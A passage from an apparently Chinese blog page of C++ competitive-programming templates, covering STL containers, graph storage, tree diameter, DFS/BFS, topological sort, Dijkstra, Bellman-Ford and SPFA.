<span class="title">lower_bound</span><span class="params">()</span>/<span class="title">upper_bound</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">unordered_set, unordered_map, unordered_multiset, unordered_multimap, 哈希表</span></span><br><span class="line"><span class="function">    和上面类似，增删改查的时间复杂度是 <span class="title">O</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function">    不支持 <span class="title">lower_bound</span><span class="params">()</span>/<span class="title">upper_bound</span><span class="params">()</span>， 迭代器的++，--</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">bitset, 圧位</span></span><br><span class="line"><span class="function">    bitset&lt;10000&gt; s</span>;</span><br><span class="line">    ~, &amp;, |, ^</span><br><span class="line">    &gt;&gt;, &lt;&lt;</span><br><span class="line">    ==, !=</span><br><span class="line">    []</span><br><span class="line"></span><br><span class="line">    <span class="built_in">count</span>()  返回有多少个<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">any</span>()  判断是否至少有一个<span class="number">1</span></span><br><span class="line">    <span class="built_in">none</span>()  判断是否全为<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">set</span>()  把所有位置成<span class="number">1</span></span><br><span class="line">    <span class="built_in">set</span>(k, v)  将第k位变成v</span><br><span class="line">    <span class="built_in">reset</span>()  把所有位变成<span class="number">0</span></span><br><span class="line">    <span class="built_in">flip</span>()  等价于~</span><br><span class="line">    <span class="built_in">flip</span>(k) 把第k位取反</span><br></pre></td></tr></table></figure><h2 id="搜索与图论">搜索与图论</h2><h3 id="邻接表存树和图">邻接表存树和图</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对于每个点k，开一个单链表，存储k所有可以走到的点。h[k]存储这个单链表的头结点</span></span><br><span class="line"><span class="type">int</span> h[N], e[N], ne[N], idx;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加一条边a-&gt;b</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e[idx] = b, ne[idx] = h[a], h[a] = idx ++ ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化</span></span><br><span class="line">idx = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(h, <span class="number">-1</span>, <span class="keyword">sizeof</span> h);</span><br></pre></td></tr></table></figure><h3 id="求树的直径-最长路径">求树的直径（最长路径）</h3> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 任取一点x，找到距离x最远点y，距离y最远距离即为树的直径</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> h[N], e[<span class="number">2</span> * N], ne[<span class="number">2</span> * N], w[<span class="number">2</span> * N], idx;</span><br><span class="line"><span class="type">int</span> dist[N]; <span class="comment">//某点到其余各点距离</span></span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">e[idx] = b;</span><br><span class="line">ne[idx] = h[a];</span><br><span class="line">w[idx] = c;</span><br><span class="line">h[a] = idx++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> father, <span class="type">int</span> distance)</span> <span class="comment">//传入父节点，防止树向上遍历回去</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">dist[u] = distance;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = h[u]; i != <span class="number">-1</span>; i = ne[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (e[i] != father)</span><br><span class="line"><span class="built_in">dfs</span>(e[i], u, distance + w[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">memset</span>(h, <span class="number">-1</span>, <span class="keyword">sizeof</span> h);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++)<span class="comment">//树有n-1条边</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a, b, c;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;a, &amp;b, &amp;c);</span><br><span class="line"><span class="built_in">add</span>(a, b, c);</span><br><span class="line"><span class="built_in">add</span>(b, a, c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">dfs</span>(<span class="number">1</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="type">int</span> mres = <span class="number">1</span>; <span class="comment">//与1点距离最远点的编号</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++)</span><br><span class="line"><span class="keyword">if</span> (dist[i] &gt; dist[mres])</span><br><span class="line">mres = i;</span><br><span class="line"><span class="built_in">dfs</span>(mres, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++)</span><br><span class="line"><span class="keyword">if</span> (dist[i] &gt; dist[mres])</span><br><span class="line">mres = i;</span><br><span class="line"><span class="type">int</span> res = dist[mres];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>, res * <span class="number">10</span> + ((<span class="type">long</span> <span class="type">long</span>)res + <span class="number">1</span>) * res / <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="深搜">深搜</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    st[u] = <span class="literal">true</span>; <span class="comment">// st[u] 表示点u已经被遍历过</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = h[u]; i != <span class="number">-1</span>; i = ne[i])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> j = e[i];</span><br><span class="line">        <span class="keyword">if</span> (!st[j]) <span class="built_in">dfs</span>(j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="宽搜">宽搜</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">st[<span class="number">1</span>] = <span class="literal">true</span>; <span class="comment">// 表示1号点已经被遍历过</span></span><br><span class="line">q.<span class="built_in">push</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (q.<span class="built_in">size</span>())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> t = q.<span class="built_in">front</span>();</span><br><span class="line">    q.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = h[t]; i != <span class="number">-1</span>; i = ne[i])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> j = e[i];</span><br><span class="line">        <span class="keyword">if</span> (!st[j])</span><br><span class="line">        &#123;</span><br><span class="line">            st[j] = <span class="literal">true</span>; <span class="comment">// 表示点j已经被遍历过</span></span><br><span class="line">            q.<span class="built_in">push</span>(j);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="拓扑排序">拓扑排序</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">topsort</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> hh = <span class="number">0</span>, tt = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// d[i] 存储点i的入度</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ )</span><br><span class="line">        <span class="keyword">if</span> (!d[i])</span><br><span class="line">            q[ ++ tt] = i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (hh &lt;= tt)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> t = q[hh ++ ];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = h[t]; i != <span class="number">-1</span>; i = ne[i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> j = e[i];</span><br><span class="line">            <span class="keyword">if</span> (-- d[j] == <span class="number">0</span>)</span><br><span class="line">                q[ ++ tt] = j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果所有点都入队了，说明存在拓扑序列；否则不存在拓扑序列。</span></span><br><span class="line">    <span class="keyword">return</span> tt == n - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="朴素dijkstra">朴素Dijkstra</h3><p>无负权边单源最短路，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo>+</mo><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2+e)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">e</span><span class="mclose">)</span></span></span></span></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> g[N][N];  <span class="comment">// 存储每条边</span></span><br><span class="line"><span class="type">int</span> dist[N];  <span class="comment">// 存储1号点到每个点的最短距离</span></span><br><span class="line"><span class="type">bool</span> st[N];   <span class="comment">// 存储每个点的最短路是否已经确定</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 求1号点到n号点的最短路，如果不存在则返回-1</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dijkstra</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dist, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> dist);</span><br><span class="line">    dist[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> t = <span class="number">-1</span>;     <span class="comment">// 在还未确定最短路的点中，寻找距离最小的点</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j ++ )</span><br><span class="line">            <span class="keyword">if</span> (!st[j] &amp;&amp; (t == <span class="number">-1</span> || dist[t] &gt; dist[j]))</span><br><span class="line">                t = j;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 用t更新其他点的距离</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j ++ )</span><br><span class="line">            dist[j] = <span class="built_in">min</span>(dist[j], dist[t] + g[t][j]);</span><br><span class="line"></span><br><span class="line">        st[t] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dist[n] == <span class="number">0x3f3f3f3f</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> dist[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="堆优化dijkstra">堆优化Dijkstra</h3><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>e</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(elogn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; PII;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n;      <span class="comment">// 点的数量</span></span><br><span class="line"><span class="type">int</span> h[N], w[N], e[N], ne[N], idx;       <span class="comment">// 邻接表存储所有边</span></span><br><span class="line"><span class="type">int</span> dist[N];        <span class="comment">// 存储所有点到1号点的距离</span></span><br><span class="line"><span class="type">bool</span> st[N];     <span class="comment">// 存储每个点的最短距离是否已确定</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 求1号点到n号点的最短距离，如果不存在，则返回-1</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dijkstra</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dist, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> dist);</span><br><span class="line">    dist[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    priority_queue&lt;PII, vector&lt;PII&gt;, greater&lt;PII&gt;&gt; heap;</span><br><span class="line">    heap.<span class="built_in">push</span>(&#123;<span class="number">0</span>, <span class="number">1</span>&#125;);      <span class="comment">// first存储距离，second存储节点编号</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (heap.<span class="built_in">size</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> t = heap.<span class="built_in">top</span>();</span><br><span class="line">        heap.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> ver = t.second, distance = t.first;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (st[ver]) <span class="keyword">continue</span>;</span><br><span class="line">        st[ver] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = h[ver]; i != <span class="number">-1</span>; i = ne[i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> j = e[i];</span><br><span class="line">            <span class="keyword">if</span> (dist[j] &gt; distance + w[i])</span><br><span class="line">            &#123;</span><br><span class="line">                dist[j] = distance + w[i];</span><br><span class="line">                heap.<span class="built_in">push</span>(&#123;dist[j], j&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dist[n] == <span class="number">0x3f3f3f3f</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> dist[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="bellman-ford算法">Bellman-Ford算法</h3><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>e</mi><mo>∗</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(e*n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span> 有负权边（回路），且有边数限制的单源最短路问题</p><p>可以判断负环，但一般用spfa</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">510</span>, M = <span class="number">10010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    <span class="type">int</span> w;</span><br><span class="line">&#125; e[M];<span class="comment">//把每个边保存下来即可</span></span><br><span class="line"><span class="type">int</span> dist[N];</span><br><span class="line"><span class="type">int</span> back[N];<span class="comment">//备份数组防止串联</span></span><br><span class="line"><span class="type">int</span> n, m, k;<span class="comment">//k代表最短路径最多包涵k条边</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">bellman_ford</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dist, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> dist);</span><br><span class="line">    dist[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;<span class="comment">//k次循环</span></span><br><span class="line">        <span class="built_in">memcpy</span>(back, dist, <span class="keyword">sizeof</span> dist);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123;<span class="comment">//遍历所有边</span></span><br><span class="line">            <span class="type">int</span> a = e[j].a, b = e[j].b, w = e[j].w;</span><br><span class="line">            dist[b] = <span class="built_in">min</span>(dist[b], back[a] + w);</span><br><span class="line">            <span class="comment">//使用backup:避免给a更新后立马更新b, 这样b一次性最短路径就多了两条边出来</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (dist[n] &gt; <span class="number">0x3f3f3f3f</span> / <span class="number">2</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> dist[n];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;n, &amp;m, &amp;k);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        <span class="type">int</span> a, b, w;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;a, &amp;b, &amp;w);</span><br><span class="line">        e[i] = &#123;a, b, w&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> res = <span class="built_in">bellman_ford</span>();</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) <span class="built_in">puts</span>(<span class="string">&quot;impossible&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> cout &lt;&lt; res;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="spfa">spfa</h3><p>平均<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(e)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">e</span><span class="mclose">)</span></span></span></span></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> n;      <span class="comment">// 总点数</span></span><br><span class="line"><span class="type">int</span> h[N], w[N], e[N], ne[N], idx;       <span class="comment">// 邻接表存储所有边</span></span><br><span class="line"><span class="type">int</span> dist[N];        <span class="comment">// 存储每个点到1号点的最短距离</span></span><br><span class="line"><span class="type">bool</span> st[N];     <span class="comment">// 存储每个点是否在队列中</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 求1号点到n号点的最短路距离，如果从1号点无法走到n号点则返回-1</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">spfa</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dist, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> dist);</span><br><span class="line">    dist[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(<span class="number">1</span>);</span><br><span class="line">    st[<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (q.<span class="built_in">size</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> t = q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">        st[t] = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = h[t]; i != <span class="number">-1</span>; i = ne[i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> j = e[i];</span><br><span class="line">            <span class="keyword">if</span> (dist[j] &gt; dist[t] + w[i])</span><br><span class="line">            &#123;</span><br><span class="line">                dist[j] = dist[t] + w[i];</span><br><span class="line">                <span class="keyword">if</span> (!st[j])     <span class="comment">// 如果队列中已存在j，则不需要将j重复插入</span></span><br><span class="line">                &#123;</span><br><span class="line">                    q.<span class="built_in">push</span>(j);</span><br><span class="line">                    st[j] = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 